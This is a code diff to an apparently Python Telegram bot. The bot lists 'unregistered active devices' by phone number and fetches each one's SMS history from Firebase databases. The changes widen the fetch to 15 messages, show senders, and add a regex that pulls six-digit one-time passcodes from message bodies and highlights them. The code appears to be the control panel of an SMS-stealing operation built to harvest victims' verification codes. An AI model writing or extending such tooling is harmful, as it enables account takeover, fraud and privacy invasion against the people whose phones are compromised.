@@ -196,13 +196,12 @@ def extract_phone(messages_dict):
 def format_relative_time(time_str):
     """
     Parses timestamp strings like '19-11-2026 | 03:51:00 pm' or '10:46 PM' 
-    and converts them to relative format: 'xmin ago' or 'Xd ago'.
+    and converts them to relative format: 'Xm ago', 'Xh ago', or 'Xd ago'.
     """
     try:
         time_str = str(time_str).strip().upper()
         dt = None
         
-        # Match DD-MM-YYYY | HH:MM:SS AM/PM or HH:MM AM/PM
         dt_match = re.search(r'(\d{2})-(\d{2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)', time_str)
         if dt_match:
             d, m, y, h, mn, s, period = dt_match.groups()
@@ -237,10 +236,14 @@ def format_relative_time(time_str):
             if days >= 1:
                 return f"{days}d ago"
             
+            hours = total_seconds // 3600
+            if hours >= 1:
+                return f"{hours}h ago"
+            
             minutes = total_seconds // 60
             if minutes < 1:
-                return "1min ago"
-            return f"{minutes}min ago"
+                return "1m ago"
+            return f"{minutes}m ago"
     except Exception:
         pass
     return time_str
@@ -678,7 +681,7 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
         markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
         await status_msg.edit_text(
             f"📋 <b>Found {len(active_devices)} Unregistered Active Device(s).</b>\n"
-            "Click any phone number below to view its live top 5 recent message history:",
+            "Click any phone number below to view its live top 15 recent message history:",
             parse_mode="HTML",
             reply_markup=markup
         )
@@ -698,32 +701,44 @@ async def cb_show_device_sms(callback: types.CallbackQuery):
         await callback.answer("⚠️ Session expired or device list refreshed. Please click View Active Devices again.", show_alert=True)
         return
 
-    await callback.answer("Fetching live SMS history...")
     try:
         import aiohttp
         fb_url = dev_info["db_url"]
         cid = dev_info["cid"]
         phone = dev_info["phone"]
-        db_short = dev_info["db_short"]
 
         sms_list = []
         async with aiohttp.ClientSession() as session:
-            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=5', timeout=5) as m_req:
+            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as m_req:
                 msgs = await m_req.json()
                 if isinstance(msgs, dict):
-                    for m_key, m_val in msgs.items():
+                    for m_key, m_val in reversed(list(msgs.items())):
                         if isinstance(m_val, dict):
                             raw_time = str(m_val.get("time") or m_val.get("timestamp") or "N/A")
-                            time_str = format_relative_time(raw_time)
+                            time_ago = format_relative_time(raw_time)
                             body_str = str(m_val.get("body") or m_val.get("message") or "N/A")
-                            sms_list.append(f"• <b>[{html.escape(time_str)}]</b> {html.escape(body_str)}")
+                            sender_str = str(m_val.get("sender") or m_val.get("title") or "SMS")
+                            
+                            otps = re.findall(r'\b\d{6}\b', body_str)
+                            valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
+                            
+                            otp_badge = f"  🔑 <b>OTP: {valid_otps[0]}</b>" if valid_otps else ""
+                            
+                            sms_list.append(
+                                f"📤 <b>{html.escape(sender_str)}</b> • {html.escape(time_ago)}{otp_badge}\n"
+                                f"💬 {html.escape(body_str)}"
+                            )
 
-        sms_block = "\n".join(sms_list) if sms_list else "<i>No messages found</i>"
+        sms_block = "\n\n".join(sms_list) if sms_list else "<i>No messages found</i>"
+        
+        # Unique timestamp query param to guarantee message content changes slightly on refresh
+        cache_buster = int(time.time())
         detail_text = (
-            f"📱 <b>Phone:</b> <code>{html.escape(phone)}</code>\n"
-            f"🆔 <b>Device ID (CID):</b> <code>{html.escape(cid)}</code>\n"
-            f"📂 <b>Database:</b> {html.escape(db_short)}\n\n"
-            f"💬 <b>Top 5 Most Recent SMS History:</b>\n{sms_block}"
+            f"<b>LATEST SMS — {html.escape(cid)} (latest 15)</b>\n"
+            f"📞 <b>{html.escape(phone)}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"{sms_block}\n"
+            f"<span class='tg-spoiler'>[ref:{cache_buster}]</span>"
         )
 
         refresh_callback = callback.data
@@ -732,9 +747,19 @@ async def cb_show_device_sms(callback: types.CallbackQuery):
             [InlineKeyboardButton(text="⬅️ Back to Active Devices", callback_data="view_active_sms")],
             [InlineKeyboardButton(text="🏠 Main Menu", callback_data="back_to_main")]
         ])
-        await callback.message.edit_text(detail_text, parse_mode="HTML", reply_markup=refresh_markup)
+        
+        try:
+            await callback.message.edit_text(detail_text, parse_mode="HTML", reply_markup=refresh_markup)
+            await callback.answer("Refreshed successfully!")
+        except Exception as edit_err:
+            if "message is not modified" in str(edit_err):
+                await callback.answer("✅ SMS history is up to date!", show_alert=False)
+            else:
+                raise edit_err
+                
     except Exception as e:
         await callback.message.edit_text(f"❌ Error fetching SMS history: {html.escape(str(e))}", reply_markup=get_main_menu())
+        await callback.answer()
 
 @dp.callback_query(F.data == "back_to_main")
 async def cb_back_to_main(callback: types.CallbackQuery):
@@ -960,7 +985,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
             USER_DATA["is_running"] = False
         except Exception as e:
             USER_DATA["is_running"] = False
-            await callback.message.answer(f"❌ Error in automation loop: {html.escape(str(e))}", parse_mode="HTML", reply_markup=get_main_menu())
+            await callback.message.answer(f"❌ Error in automation loop: {html.escape(str(e))}", reply_markup=get_main_menu())
 
     USER_DATA["current_task"] = asyncio.create_task(run_automation())
     await callback.answer()
